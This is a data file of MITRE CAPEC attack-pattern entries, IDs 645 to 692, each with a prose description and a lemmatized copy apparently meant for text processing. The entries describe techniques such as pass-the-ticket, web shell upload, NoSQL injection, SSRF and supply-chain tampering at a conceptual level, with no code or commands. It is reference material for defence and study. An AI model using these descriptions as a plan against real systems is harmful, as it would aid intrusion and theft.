CAPEC-645,Use of Captured Tickets (Pass The Ticket),"An adversary uses stolen Kerberos tickets to access systems/resources that leverage the Kerberos authentication protocol. The Kerberos authentication protocol centers around a ticketing system which is used to request/grant access to services and to then access the requested services. An adversary can obtain any one of these tickets (e.g. Service Ticket, Ticket Granting Ticket, Silver Ticket, or Golden Ticket) to authenticate to a system/resource without needing the account's credentials. Depending on the ticket obtained, the adversary may be able to access a particular resource or generate TGTs for any account within an Active Directory Domain.",adversary use steal kerberos ticket access system resource leverage kerberos authentication protocol kerberos authentication protocol center ticketing system request grant access service access request service adversary obtain ticket service ticket ticket granting ticket silver ticket golden ticket authenticate system resource need account credential depend ticket obtain adversary able access particular resource generate tgt account active directory domain
CAPEC-646,Peripheral Footprinting,"Adversaries may attempt to obtain information about attached peripheral devices and components connected to a computer system. Examples may include discovering the presence of iOS devices by searching for backups, analyzing the Windows registry to determine what USB devices have been connected, or infecting a victim system with malware to report when a USB device has been connected. This may allow the adversary to gain additional insight about the system or network environment, which may be useful in constructing further attacks.",adversary attempt obtain information attach peripheral device component connect computer system example include discover presence ios device search backup analyze windows registry determine usb device connect infect victim system malware report usb device connect allow adversary gain additional insight system network environment useful construct attack
CAPEC-647,Collect Data from Registries,"An adversary exploits a weakness in authorization to gather system-specific data and sensitive information within a registry (e.g., Windows Registry, Mac plist). These contain information about the system configuration, software, operating system, and security. The adversary can leverage information gathered in order to carry out further attacks.",adversary exploit weakness authorization gather system specific datum sensitive information registry windows registry mac plist contain information system configuration software operate system security adversary leverage information gather order carry attack
CAPEC-648,Collect Data from Screen Capture,"An adversary gathers sensitive information by exploiting the system's screen capture functionality. Through screenshots, the adversary aims to see what happens on the screen over the course of an operation. The adversary can leverage information gathered in order to carry out further attacks.",adversary gather sensitive information exploit system screen capture functionality screenshot adversary aim happen screen course operation adversary leverage information gather order carry attack
CAPEC-649,Adding a Space to a File Extension,"An adversary adds a space character to the end of a file extension and takes advantage of an application that does not properly neutralize trailing special elements in file names. This extra space, which can be difficult for a user to notice, affects which default application is used to operate on the file and can be leveraged by the adversary to control execution.",adversary add space character end file extension take advantage application properly neutralize trailing special element file name extra space difficult user notice affect default application operate file leverage adversary control execution
CAPEC-65,Sniff Application Code,"An adversary passively sniffs network communications and captures application code bound for an authorized client. Once obtained, they can use it as-is, or through reverse-engineering glean sensitive information or exploit the trust relationship between the client and server. Such code may belong to a dynamic update to the client, a patch being applied to a client component or any such interaction where the client is authorized to communicate with the server.",adversary passively sniff network communication capture application code bind authorized client obtain use reverse engineering glean sensitive information exploit trust relationship client server code belong dynamic update client patch apply client component interaction client authorize communicate server
CAPEC-650,Upload a Web Shell to a Web Server,"By exploiting insufficient permissions, it is possible to upload a web shell to a web server in such a way that it can be executed remotely. This shell can have various capabilities, thereby acting as a ""gateway"" to the underlying web server. The shell might execute at the higher permission level of the web server, providing the ability the execute malicious code at elevated levels.",exploit insufficient permission possible upload web shell web server way execute remotely shell capability act gateway underlying web server shell execute high permission level web server provide ability execute malicious code elevated level
CAPEC-651,Eavesdropping,"An adversary intercepts a form of communication (e.g. text, audio, video) by way of software (e.g., microphone and audio recording application), hardware (e.g., recording equipment), or physical means (e.g., physical proximity). The goal of eavesdropping is typically to gain unauthorized access to sensitive information about the target for financial, personal, political, or other gains. Eavesdropping is different from a sniffing attack as it does not take place on a network-based communication channel (e.g., IP traffic). Instead, it entails listening in on the raw audio source of a conversation between two or more parties.",adversary intercept form communication text audio video way software microphone audio recording application hardware record equipment physical mean physical proximity goal eavesdropping typically gain unauthorized access sensitive information target financial personal political gain eavesdropping different sniffing attack place network base communication channel ip traffic instead entail listen raw audio source conversation party
CAPEC-652,Use of Known Kerberos Credentials,"An adversary obtains (i.e. steals or purchases) legitimate Kerberos credentials (e.g. Kerberos service account userID/password or Kerberos Tickets) with the goal of achieving authenticated access to additional systems, applications, or services within the domain.Kerberos is the default authentication method for Windows domains and is also used across many operating systems. Attacks leveraging trusted Kerberos credentials can result in numerous consequences, depending on what Kerberos credential is stolen. For example, Kerberos service accounts are typically used to run services or scheduled tasks pertaining to authentication. However, these credentials are often weak and never expire, in addition to possessing local or domain administrator privileges. If an adversary is able to acquire these credentials, it could result in lateral movement within the domain or access to any resources the service account is privileged to access, among other things. Ultimately, successful spoofing and impersonation of trusted Kerberos credentials can lead to an adversary breaking authentication, authorization, and audit controls with the target system or application.",adversary obtain steal purchase legitimate kerberos credential kerberos service account userid password kerberos tickets goal achieve authenticate access additional system application service domain kerberos default authentication method windows domain operate system attack leverage trust kerberos credential result numerous consequence depend kerberos credential steal example kerberos service account typically run service schedule task pertain authentication credential weak expire addition possess local domain administrator privilege adversary able acquire credential result lateral movement domain access resource service account privileged access thing ultimately successful spoofing impersonation trust kerberos credential lead adversary break authentication authorization audit control target system application
CAPEC-653,Use of Known Operating System Credentials,"An adversary guesses or obtains (i.e. steals or purchases) legitimate operating system credentials (e.g. userID/password) to achieve authentication and to perform authorized actions on the system, under the guise of an authenticated user or service. This applies to any Operating System.This attack can be extremely harmful when the operating system credentials used are for a root or admin user. Once an adversary gains access using credentials with elevated privileges, they are free to alter important system files which can effect other users who may use the system or other users on the system's network.",adversary guess obtain steal purchase legitimate operate system credential userid password achieve authentication perform authorized action system guise authenticated user service apply operating system attack extremely harmful operate system credential root admin user adversary gain access credential elevated privilege free alter important system file effect user use system user system network
CAPEC-654,Credential Prompt Impersonation,"An adversary, through a previously installed malicious application, impersonates a credential prompt in an attempt to steal a user's credentials.The adversary may monitor the task list maintained by the operating system and wait for a specific legitimate credential prompt to become active. Once the prompt is detected, the adversary launches a new credential prompt in the foreground that mimics the user interface of the legitimate credential prompt. At this point, the user thinks that they are interacting with the legitimate credential prompt, but instead they are interacting with the malicious credential prompt.A second approach involves the adversary impersonating an unexpected credential prompt, but one that may often be spawned by legitimate background processes. For example, an adversary may randomly impersonate a system credential prompt, implying that a background process or commonly used application (e.g., email reader) requires authentication for some purpose. The user, believing they are interacting with a legitimate credential prompt, enters their credentials which the adversary then leverages for nefarious purposes. The ultimate goal of this attack is to obtain sensitive information (e.g., credentials) from the user.",adversary previously instal malicious application impersonate credential prompt attempt steal user credential adversary monitor task list maintain operate system wait specific legitimate credential prompt active prompt detect adversary launch new credential prompt foreground mimic user interface legitimate credential prompt point user think interact legitimate credential prompt instead interact malicious credential prompt second approach involve adversary impersonate unexpected credential prompt spawn legitimate background process example adversary randomly impersonate system credential prompt imply background process commonly application email reader require authentication purpose user believe interact legitimate credential prompt enter credential adversary leverage nefarious purpose ultimate goal attack obtain sensitive information credential user
CAPEC-655,Avoid Security Tool Identification by Adding Data,"An adversary adds data to a file to increase the file size beyond what security tools are capable of handling in an attempt to mask their actions.In addition to this, adding data to a file also changes the file's hash, frustrating security tools that look for known bad files by their hash.",adversary add datum file increase file size security tool capable handle attempt mask action addition add datum file change file hash frustrate security tool look know bad file hash
CAPEC-656,Voice Phishing,"An adversary targets users with a phishing attack for the purpose of soliciting account passwords or sensitive information from the user. Voice Phishing is a variation of the Phishing social engineering technique where the attack is initiated via a voice call, rather than email. The user is enticed to provide sensitive information by the adversary, who masquerades as a legitimate employee of the alleged organization. Voice Phishing attacks deviate from standard Phishing attacks, in that a user doesn't typically interact with a compromised website to provide sensitive information and instead provides this information verbally. Voice Phishing attacks can also be initiated by either the adversary in the form of a ""cold call"" or by the victim if calling an illegitimate telephone number.",adversary target user phishing attack purpose solicit account password sensitive information user voice phishing variation phishing social engineering technique attack initiate voice email user entice provide sensitive information adversary masquerade legitimate employee alleged organization voice phishing attack deviate standard phishing attack user typically interact compromise website provide sensitive information instead provide information verbally voice phishing attack initiate adversary form cold victim call illegitimate telephone number
CAPEC-657,Malicious Automated Software Update via Spoofing,"An attackers uses identify or content spoofing to trick a client into performing an automated software update from a malicious source. A malicious automated software update that leverages spoofing can include content or identity spoofing as well as protocol spoofing. Content or identity spoofing attacks can trigger updates in software by embedding scripted mechanisms within a malicious web page, which masquerades as a legitimate update source. Scripting mechanisms communicate with software components and trigger updates from locations specified by the attackers' server. The result is the client believing there is a legitimate software update available but instead downloading a malicious update from the attacker.",attackers use identify content spoofing trick client perform automate software update malicious source malicious automate software update leverage spoofing include content identity spoofing protocol spoofing content identity spoofing attack trigger update software embed script mechanism malicious web page masquerade legitimate update source scripting mechanism communicate software component trigger update location specify attacker server result client believe legitimate software update available instead download malicious update attacker
CAPEC-66,SQL Injection,"This attack exploits target software that constructs SQL statements based on user input. An attacker crafts input strings so that when the target software constructs SQL statements based on the input, the resulting SQL statement performs actions other than those the application intended. SQL Injection results from failure of the application to appropriately validate input.When specially crafted user-controlled input consisting of SQL syntax is used without proper validation as part of SQL queries, it is possible to glean information from the database in ways not envisaged during application design. Depending upon the database and the design of the application, it may also be possible to leverage injection to have the database execute system-related commands of the attackers' choice. SQL Injection enables an attacker to interact directly to the database, thus bypassing the application completely. Successful injection can cause information disclosure as well as ability to add or modify data in the database.",attack exploit target software construct sql statement base user input attacker craft input string target software construct sql statement base input result sql statement perform action application intend sql injection result failure application appropriately validate input specially craft user control input consist sql syntax proper validation sql query possible glean information database way envisage application design depend database design application possible leverage injection database execute system relate command attacker choice sql injection enable attacker interact directly database bypass application completely successful injection cause information disclosure ability add modify datum database
CAPEC-660,Root/Jailbreak Detection Evasion via Hooking,"An adversary forces a non-restricted mobile application to load arbitrary code or code files, via Hooking, with the goal of evading Root/Jailbreak detection. Mobile device users often Root/Jailbreak their devices in order to gain administrative control over the mobile operating system and/or to install third-party mobile applications that are not provided by authorized application stores (e.g. Google Play Store and Apple App Store). Adversaries may further leverage these capabilities to escalate privileges or bypass access control on legitimate applications. Although many mobile applications check if a mobile device is Rooted/Jailbroken prior to authorized use of the application, adversaries may be able to ""hook"" code in order to circumvent these checks. Successfully evading Root/Jailbreak detection allows an adversary to execute administrative commands, obtain confidential data, impersonate legitimate users of the application, and more.",adversary force non restricted mobile application load arbitrary code code file hooking goal evade root jailbreak detection mobile device user root jailbreak device order gain administrative control mobile operate system install party mobile application provide authorized application store google play store apple app store adversary leverage capability escalate privilege bypass access control legitimate application mobile application check mobile device rooted jailbroken prior authorized use application adversary able hook code order circumvent check successfully evade root jailbreak detection allow adversary execute administrative command obtain confidential datum impersonate legitimate user application
CAPEC-661,Root/Jailbreak Detection Evasion via Debugging,"An adversary inserts a debugger into the program entry point of a mobile application to modify the application binary, with the goal of evading Root/Jailbreak detection. Mobile device users often Root/Jailbreak their devices in order to gain administrative control over the mobile operating system and/or to install third-party mobile applications that are not provided by authorized application stores (e.g. Google Play Store and Apple App Store). Rooting/Jailbreaking a mobile device also provides users with access to system debuggers and disassemblers, which can be leveraged to exploit applications by dumping the application's memory at runtime in order to remove or bypass signature verification methods. This further allows the adversary to evade Root/Jailbreak detection mechanisms, which can result in execution of administrative commands, obtaining confidential data, impersonating legitimate users of the application, and more.",adversary insert debugger program entry point mobile application modify application binary goal evade root jailbreak detection mobile device user root jailbreak device order gain administrative control mobile operate system install party mobile application provide authorized application store google play store apple app store root jailbreake mobile device provide user access system debugger disassembler leverage exploit application dump application memory runtime order remove bypass signature verification method allow adversary evade root jailbreak detection mechanism result execution administrative command obtain confidential datum impersonate legitimate user application
CAPEC-662,Adversary in the Browser (AiTB),"An adversary exploits security vulnerabilities or inherent functionalities of a web browser, in order to manipulate traffic between two endpoints.This attack first requires the adversary to trick the victim into installing a Trojan Horse application on their system, such as a malicious web browser plugin, which the adversary then leverages to mount the attack. The victim interacts with a web application, such as a banking website, in a normal manner and under the assumption that the connection is secure. However, the adversary can now alter and/or reroute traffic between the client application (e.g., web browser) and the coinciding endpoint, while simultaneously displaying intended transactions and data back to the user. The adversary may also be able to glean cookies, HTTP sessions, and SSL client certificates, which can be used to pivot into an authenticated intranet. Identifying AITB is often difficult because these attacks are successful even when security mechanisms such as SSL/PKI and multifactor authentication are present, since they still function as intended during the attack.",adversary exploit security vulnerability inherent functionality web browser order manipulate traffic endpoint attack require adversary trick victim instal trojan horse application system malicious web browser plugin adversary leverage mount attack victim interact web application banking website normal manner assumption connection secure adversary alter reroute traffic client application web browser coincide endpoint simultaneously display intended transaction datum user adversary able glean cookie http session ssl client certificate pivot authenticated intranet identify aitb difficult attack successful security mechanism ssl pki multifactor authentication present function intend attack
CAPEC-663,Exploitation of Transient Instruction Execution,"An adversary exploits a hardware design flaw in a CPU implementation of transient instruction execution to expose sensitive data and bypass/subvert access control over restricted resources. Typically, the adversary conducts a covert channel attack to target non-discarded microarchitectural changes caused by transient executions such as speculative execution, branch prediction, instruction pipelining, and/or out-of-order execution. The transient execution results in a series of instructions (gadgets) which construct covert channel and access/transfer the secret data.",adversary exploit hardware design flaw cpu implementation transient instruction execution expose sensitive datum bypass subvert access control restrict resource typically adversary conduct covert channel attack target non discarded microarchitectural change cause transient execution speculative execution branch prediction instruction pipelining order execution transient execution result serie instruction gadget construct covert channel access transfer secret datum
CAPEC-664,Server Side Request Forgery,"An adversary exploits improper input validation by submitting maliciously crafted input to a target application running on a server, with the goal of forcing the server to make a request either to itself, to web services running in the server’s internal network, or to external third parties. If successful, the adversary’s request will be made with the server’s privilege level, bypassing its authentication controls. This ultimately allows the adversary to access sensitive data, execute commands on the server’s network, and make external requests with the stolen identity of the server. Server Side Request Forgery attacks differ from Cross Site Request Forgery attacks in that they target the server itself, whereas CSRF attacks exploit an insecure user authentication mechanism to perform unauthorized actions on the user's behalf.",adversary exploit improper input validation submit maliciously craft input target application run server goal force server request web service run server internal network external party successful adversary request server privilege level bypass authentication control ultimately allow adversary access sensitive datum execute command server network external request steal identity server server request forgery attack differ cross site request forgery attack target server csrf attack exploit insecure user authentication mechanism perform unauthorized action user behalf
CAPEC-665,Exploitation of Thunderbolt Protection Flaws,"An adversary leverages a firmware weakness within the Thunderbolt protocol, on a computing device to manipulate Thunderbolt controller firmware in order to exploit vulnerabilities in the implementation of authorization and verification schemes within Thunderbolt protection mechanisms. Upon gaining physical access to a target device, the adversary conducts high-level firmware manipulation of the victim Thunderbolt controller SPI (Serial Peripheral Interface) flash, through the use of a SPI Programing device and an external Thunderbolt device, typically as the target device is booting up. If successful, this allows the adversary to modify memory, subvert authentication mechanisms, spoof identities and content, and extract data and memory from the target device. Currently 7 major vulnerabilities exist within Thunderbolt protocol with 9 attack vectors as noted in the Execution Flow.",adversary leverage firmware weakness thunderbolt protocol compute device manipulate thunderbolt controller firmware order exploit vulnerability implementation authorization verification scheme thunderbolt protection mechanism gain physical access target device adversary conduct high level firmware manipulation victim thunderbolt controller spi serial peripheral interface flash use spi programing device external thunderbolt device typically target device boot successful allow adversary modify memory subvert authentication mechanism spoof identity content extract datum memory target device currently major vulnerability exist thunderbolt protocol attack vector note execution flow
CAPEC-666,BlueSmacking,An adversary uses Bluetooth flooding to transfer large packets to Bluetooth enabled devices over the L2CAP protocol with the goal of creating a DoS. This attack must be carried out within close proximity to a Bluetooth enabled device.,adversary use bluetooth flooding transfer large packet bluetooth enable device protocol goal create attack carry close proximity bluetooth enable device
CAPEC-667,Bluetooth Impersonation AttackS (BIAS),An adversary disguises the MAC address of their Bluetooth enabled device to one for which there exists an active and trusted connection and authenticates successfully. The adversary can then perform malicious actions on the target Bluetooth device depending on the target’s capabilities.,adversary disguise mac address bluetooth enable device exist active trusted connection authenticate successfully adversary perform malicious action target bluetooth device depend target capability
CAPEC-668,Key Negotiation of Bluetooth Attack (KNOB),"An adversary can exploit a flaw in Bluetooth key negotiation allowing them to decrypt information sent between two devices communicating via Bluetooth. The adversary uses an Adversary in the Middle setup to modify packets sent between the two devices during the authentication process, specifically the entropy bits. Knowledge of the number of entropy bits will allow the attacker to easily decrypt information passing over the line of communication.",adversary exploit flaw bluetooth key negotiation allow decrypt information send device communicate bluetooth adversary use adversary middle setup modify packet send device authentication process specifically entropy bit knowledge number entropy bit allow attacker easily decrypt information pass line communication
CAPEC-669,Alteration of a Software Update,"An adversary with access to an organization’s software update infrastructure inserts malware into the content of an outgoing update to fielded systems where a wide range of malicious effects are possible. With the same level of access, the adversary can alter a software update to perform specific malicious acts including granting the adversary control over the software’s normal functionality.",adversary access organization software update infrastructure insert malware content outgoing update field system wide range malicious effect possible level access adversary alter software update perform specific malicious act include grant adversary control software normal functionality
CAPEC-67,String Format Overflow in syslog(),"This attack targets applications and software that uses the syslog() function insecurely. If an application does not explicitely use a format string parameter in a call to syslog(), user input can be placed in the format string parameter leading to a format string injection attack. Adversaries can then inject malicious format string commands into the function call leading to a buffer overflow. There are many reported software vulnerabilities with the root cause being a misuse of the syslog() function.",attack target application software use syslog function insecurely application explicitely use format string parameter syslog user input place format string parameter lead format string injection attack adversary inject malicious format string command function lead buffer overflow report software vulnerability root cause misuse syslog function
CAPEC-670,Software Development Tools Maliciously Altered,"An adversary with the ability to alter tools used in a development environment causes software to be developed with maliciously modified tools. Such tools include requirements management and database tools, software design tools, configuration management tools, compilers, system build tools, and software performance testing and load testing tools. The adversary then carries out malicious acts once the software is deployed including malware infection of other systems to support further compromises.",adversary ability alter tool development environment cause software develop maliciously modify tool tool include requirement management database tool software design tool configuration management tool compiler system build tool software performance testing load testing tool adversary carry malicious act software deploy include malware infection system support compromise
CAPEC-671,Requirements for ASIC Functionality Maliciously Altered,"An adversary with access to functional requirements for an application specific integrated circuit (ASIC), a chip designed/customized for a singular particular use, maliciously alters requirements derived from originating capability needs. In the chip manufacturing process, requirements drive the chip design which, when the chip is fully manufactured, could result in an ASIC which may not meet the user’s needs, contain malicious functionality, or exhibit other anomalous behaviors thereby affecting the intended use of the ASIC.",adversary access functional requirement application specific integrated circuit asic chip design customize singular particular use maliciously alter requirement derive originate capability need chip manufacture process requirement drive chip design chip fully manufacture result asic meet user need contain malicious functionality exhibit anomalous behavior affect intended use asic
CAPEC-672,Malicious Code Implanted During Chip Programming,"During the programming step of chip manufacture, an adversary with access and necessary technical skills maliciously alters a chip’s intended program logic to produce an effect intended by the adversary when the fully manufactured chip is deployed and in operational use. Intended effects can include the ability of the adversary to remotely control a host system to carry out malicious acts.",programming step chip manufacture adversary access necessary technical skill maliciously alter chip intended program logic produce effect intend adversary fully manufacture chip deploy operational use intended effect include ability adversary remotely control host system carry malicious act
CAPEC-673,Developer Signing Maliciously Altered Software,"Software produced by a reputable developer is clandestinely infected with malicious code and then digitally signed by the unsuspecting developer, where the software has been altered via a compromised software development or build process prior to being signed. The receiver or user of the software has no reason to believe that it is anything but legitimate and proceeds to deploy it to organizational systems.This attack differs from CAPEC-206, since the developer is inadvertently signing malicious code they believe to be legitimate and which they are unware of any malicious modifications.",software produce reputable developer clandestinely infect malicious code digitally sign unsuspecting developer software alter compromise software development build process prior sign receiver user software reason believe legitimate proceed deploy organizational system attack differ developer inadvertently sign malicious code believe legitimate unware malicious modification
CAPEC-674,Design for FPGA Maliciously Altered,"An adversary alters the functionality of a field-programmable gate array (FPGA) by causing an FPGA configuration memory chip reload in order to introduce a malicious function that could result in the FPGA performing or enabling malicious functions on a host system. Prior to the memory chip reload, the adversary alters the program for the FPGA by adding a function to impact system operation.",adversary alter functionality field programmable gate array fpga cause fpga configuration memory chip reload order introduce malicious function result fpga perform enable malicious function host system prior memory chip reload adversary alter program fpga add function impact system operation
CAPEC-675,Retrieve Data from Decommissioned Devices,"An adversary obtains decommissioned, recycled, or discarded systems and devices that can include an organization’s intellectual property, employee data, and other types of controlled information. Systems and devices that have reached the end of their lifecycles may be subject to recycle or disposal where they can be exposed to adversarial attempts to retrieve information from internal memory chips and storage devices that are part of the system.",adversary obtain decommission recycle discard system device include organization intellectual property employee datum type control information system device reach end lifecycle subject recycle disposal expose adversarial attempt retrieve information internal memory chip storage device system
CAPEC-676,NoSQL Injection,"An adversary targets software that constructs NoSQL statements based on user input or with parameters vulnerable to operator replacement in order to achieve a variety of technical impacts such as escalating privileges, bypassing authentication, and/or executing code.NoSQL database calls are written in an application's programming language, via a custom API call, or formatted in a common convention (e.g., JSON, XML, etc.), any of which the adversary can exploit to achieve the aforementioned goals. NoSQL attacks usually result from improper sanitization and validation of data that originates from a user, either via special character or JavaScript injection. In both cases, the adversary crafts input strings so that when the target software constructs NoSQL statements based on the input, the resulting NoSQL statement performs actions other than those intended by the application. However, unlike traditional SQL Injection attacks, NoSQL injection attacks can also occur in instances where the application does not rely upon user input, as is the case in operator replacements. This entails the adversary overriding reserved NoSQL variable names with ones that have been modified with malicious functionality (e.g., $where in MongoDB). In all cases, depending on the NoSQL API and data model used, successful injection can cause information disclosure, data modification, and code execution at the application level.Note: NoSQL Injection attacks are executed within a procedural language (e.g., C, C++, Perl), as opposed to the declarative SQL language itself. As a result, NoSQL injection attacks can potentially result in greater impacts than traditional SQL Injection attacks [REF-668].",adversary target software construct nosql statement base user input parameter vulnerable operator replacement order achieve variety technical impact escalate privilege bypass authentication execute code nosql database call write application programming language custom api format common convention json xml etc adversary exploit achieve aforementioned goal nosql attack usually result improper sanitization validation datum originate user special character javascript injection case adversary craft input string target software construct nosql statement base input result nosql statement perform action intend application unlike traditional sql injection attack nosql injection attack occur instance application rely user input case operator replacement entail adversary override reserve nosql variable name one modify malicious functionality mongodb case depend nosql api datum model successful injection cause information disclosure datum modification code execution application level note nosql injection attack execute procedural language c perl oppose declarative sql language result nosql injection attack potentially result great impact traditional sql injection attack
CAPEC-677,Server Motherboard Compromise,"Malware is inserted in a server motherboard (e.g., in the flash memory) in order to alter server functionality from that intended. The development environment or hardware/software support activity environment is susceptible to an adversary inserting malicious software into hardware components during development or update.",malware insert server motherboard flash memory order alter server functionality intend development environment hardware software support activity environment susceptible adversary insert malicious software hardware component development update
CAPEC-678,System Build Data Maliciously Altered,"During the system build process, the system is deliberately misconfigured by the alteration of the build data. Access to system configuration data files and build processes is susceptible to deliberate misconfiguration of the system.",system build process system deliberately misconfigure alteration build datum access system configuration datum file build process susceptible deliberate misconfiguration system
CAPEC-679,Exploitation of Improperly Configured or Implemented Memory Protections,"An adversary takes advantage of missing or incorrectly configured access control within memory to read/write data or inject malicious code into said memory.Hardware product designs often need to implement memory protection features to prevent users from reading and modifying memory reserved for security operations such as secure booting, authenticating code, device attestation, and more. However, these protection features may be missing if not configured by developers. For example, this can occur if the developers assume these features are configured elsewhere. Additionally, developers often attempt to impose proper protection features, but may incorrectly configure these controls. One such example would be setting controls with insufficient granularity for protected address regions. If an adversary is able to discover improper access controls surrounding memory, it could result in the adversary obtaining sensitive data, executing code, circumventing security mechanisms, escalating privileges, or even denying service to higher privilege software.",adversary take advantage miss incorrectly configure access control memory read write datum inject malicious code say memory hardware product design need implement memory protection feature prevent user read modify memory reserve security operation secure booting authenticate code device attestation protection feature miss configure developer example occur developer assume feature configure additionally developer attempt impose proper protection feature incorrectly configure control example set control insufficient granularity protect address region adversary able discover improper access control surround memory result adversary obtain sensitive datum execute code circumvent security mechanism escalate privilege deny service high privilege software
CAPEC-68,Subvert Code-signing Facilities,Many languages use code signing facilities to vouch for code's identity and to thus tie code to its assigned privileges within an environment. Subverting this mechanism can be instrumental in an attacker escalating privilege. Any means of subverting the way that a virtual machine enforces code signing classifies for this style of attack.,language use code signing facility vouch code identity tie code assign privilege environment subvert mechanism instrumental attacker escalate privilege means subvert way virtual machine enforce code signing classifie style attack
CAPEC-680,Exploitation of Improperly Controlled Registers,"An adversary exploits missing or incorrectly configured access control within registers to read/write data that is not meant to be obtained or modified by a user.Hardware systems often utilize trusted lock bits to prevent a set of registers from being written to or to restrict a register to only being written to once. Registers are also frequently used to store sensitive data leveraged in additional security operations, such as secure booting, authenticating code, device attestation, and more. However, the access control mechanisms meant to protect these registers may be fully missing or ineffective due to misconfiguration. If an adversary is able to discover improper access controls surrounding registers, it could result in the adversary obtaining sensitive data and/or modifying data that is meant to be immutable. This can ultimately result in processes like secure boot being circumvented or in protected configurations being modified.",adversary exploit missing incorrectly configure access control register read write datum mean obtain modify user hardware system utilize trust lock bit prevent set register write restrict register write register frequently store sensitive datum leverage additional security operation secure booting authenticate code device attestation access control mechanism mean protect register fully missing ineffective misconfiguration adversary able discover improper access control surround register result adversary obtain sensitive datum modify datum mean immutable ultimately result process like secure boot circumvent protect configuration modify
CAPEC-681,Exploitation of Improperly Controlled Hardware Security Identifiers,"An adversary takes advantage of missing or incorrectly configured security identifiers (e.g., tokens), which are used for access control within a System-on-Chip (SoC), to read/write data or execute a given action.A System-on-Chip (SoC) often implements a security identifier mechanism to differentiate what actions are allowed or disallowed when a transaction originates from an entity. However, these mechanisms may be exploitable due to any number of the following:The security identifiers are missingThe security identifiers are incorrectly implemented or generatedThe security identifiers are generated with an obsolete encodingThe security identifiers are generated and implemented correctly, but are improperly protectedIf the security identifiers leveraged by the SoC are missing or misconfigured, an adversary may be able to take advantage of this shortcoming to circumvent the intended access controls. This could result in the adversary gaining unintended access, performing a Denial of Service (DoS), escalating privileges, or spoofing actions from a trusted agent.",adversary take advantage missing incorrectly configure security identifier token access control system chip soc read write datum execute give action system chip soc implement security identifier mechanism differentiate action allow disallow transaction originate entity mechanism exploitable number following security identifier missingthe security identifier incorrectly implement generatedthe security identifier generate obsolete encodingthe security identifier generate implement correctly improperly protectedif security identifier leverage soc miss misconfigure adversary able advantage shortcoming circumvent intended access control result adversary gain unintended access perform denial service dos escalate privilege spoof action trust agent
CAPEC-682,Exploitation of Firmware or ROM Code with Unpatchable Vulnerabilities,"An adversary may exploit vulnerable code (i.e., firmware or ROM) that is unpatchable. Unpatchable devices exist due to manufacturers intentionally or inadvertently designing devices incapable of updating their software. Additionally, with updatable devices, the manufacturer may decide not to support the device and stop making updates to their software.When a vulnerability is found in a device that has no means of patching, the attack may be used against an entire class of devices. Devices from the same manufacturer often use similar or identical firmware, which could lead to widespread attacks. Devices of this nature are prime targets for botnet attacks. Consumer devices are frequently targeted for this attack due to the complexities of updating firmware once manufacturers no longer have physical access to a device. When exploiting a found vulnerability, adversaries often try to gain root access on a device. This allows them to use the device for any malicious purpose. Some example exploits are stealing device data, using the device for a ransomware attack, or recruiting the device for a botnet.",adversary exploit vulnerable code firmware rom unpatchable unpatchable device exist manufacturer intentionally inadvertently design device incapable update software additionally updatable device manufacturer decide support device stop make update software vulnerability find device mean patch attack entire class device device manufacturer use similar identical firmware lead widespread attack device nature prime target botnet attack consumer device frequently target attack complexity update firmware manufacturer long physical access device exploit find vulnerability adversary try gain root access device allow use device malicious purpose example exploit steal device datum device ransomware attack recruit device botnet
CAPEC-69,Target Programs with Elevated Privileges,This attack targets programs running with elevated privileges. The adversary tries to leverage a vulnerability in the running program and get arbitrary code to execute with elevated privileges.,attack target program run elevated privilege adversary try leverage vulnerability run program arbitrary code execute elevated privilege
CAPEC-690,Metadata Spoofing,"An adversary alters the metadata of a resource (e.g., file, directory, repository, etc.) to present a malicious resource as legitimate/credible.One approach to this attack entails the adversary altering a maliciously modified resource's metadata in order to hide their malicious activity. Another approach involves altering the metadata of an adversary-created resource to make the source appear more credible. Adversaries may spoof a variety of metadata across a number of resources, such as the following:Authors of Version Control System (VCS) repository commitsOpen source package statisticsFile attributes, such as when a file was last updateThe ultimate goal of a Metadata Spoofing attack is to trick victims into believing the malicious resource being provided originates from a reputable source. However, the victim instead leverages the malicious resource, which could result in a number of negative technical impacts.",adversary alter metadata resource file directory repository etc present malicious resource legitimate credible approach attack entail adversary alter maliciously modify resource metadata order hide malicious activity approach involve alter metadata adversary create resource source appear credible adversary spoof variety metadata number resource follow authors version control system vcs repository commitsopen source package statisticsfile attribute file updatethe ultimate goal metadata spoofing attack trick victim believe malicious resource provide originate reputable source victim instead leverage malicious resource result number negative technical impact
CAPEC-691,Spoof Open-Source Software Metadata,"An adversary spoofs open-source software metadata in an attempt to masquerade malicious software as popular, maintained, and trusted.Due to open-source software's popularity, it serves as a desirable attack-vector for adversaries since a single malicious component may result in the exploitation of numerous systems/applications. Adversaries may, therefore, spoof the metadata pertaining to the open-source software in order to trick victims into downloading and using their malicious software. Examples of metadata that may be spoofed include:Owner of the software (e.g., repository or package owner)Author(s) of repository commitsFrequency of repository commitsDate/Time of repository commitsPackage or Repository ""stars""Once the malicious software component has been integrated into an underlying application or executed on a system, the adversary is ultimately able to achieve numerous negative technical impacts within the system/application. This often occurs without any indication of compromise.",adversary spoof open source software metadata attempt masquerade malicious software popular maintain trust open source software popularity serve desirable attack vector adversary single malicious component result exploitation numerous system application adversary spoof metadata pertain open source software order trick victim download malicious software example metadata spoof include owner software repository package repository commitsfrequency repository commitsdate time repository commitspackage repository malicious software component integrate underlie application execute system adversary ultimately able achieve numerous negative technical impact system application occur indication compromise
CAPEC-692,Spoof Version Control System Commit Metadata,"An adversary spoofs metadata pertaining to a Version Control System (VCS) (e.g., Git) repository's commits to deceive users into believing that the maliciously provided software is frequently maintained and originates from a trusted source.Version Control Systems are widely used by developers to host, track, and manage source code files in an easy and synchronous manner. These systems are often leveraged to host open-source software that other developers can incorporate into their own applications or use as standalone applications. To prevent downloading vulnerable and/or malicious code, developers will often check the metadata of VCS repository commits to determine the repository's overall pedigree. This may include a variety of information, such as the following:Owner of the repositoryAuthor(s) of commitsFrequency of commitsDate/Time of commitsRepository activity graphsThese precursory checks can assist developers in determining whether a trusted individual/organization is providing the source code, how often the code is updated, and the relative popularity of the software. However, an adversary can spoof this metadata to make a repository containing malicious code appear as originating from a trusted source, being frequently maintained, and being commonly used by other developers. Without performing additional security activities, unassuming developers may be duped by this spoofed metadata and include the malicious code within their systems/applications. The adversary is then ultimately able to achieve numerous negative technical impacts, while the victim remains unaware of any malicious activity.",adversary spoof metadata pertain version control system vcs git repository commit deceive user believe maliciously provide software frequently maintain originate trusted source version control systems widely developer host track manage source code file easy synchronous manner system leverage host open source software developer incorporate application use standalone application prevent download vulnerable malicious code developer check metadata vcs repository commit determine repository overall pedigree include variety information follow owner commitsfrequency commitsdate time commitsrepository activity graphsthese precursory check 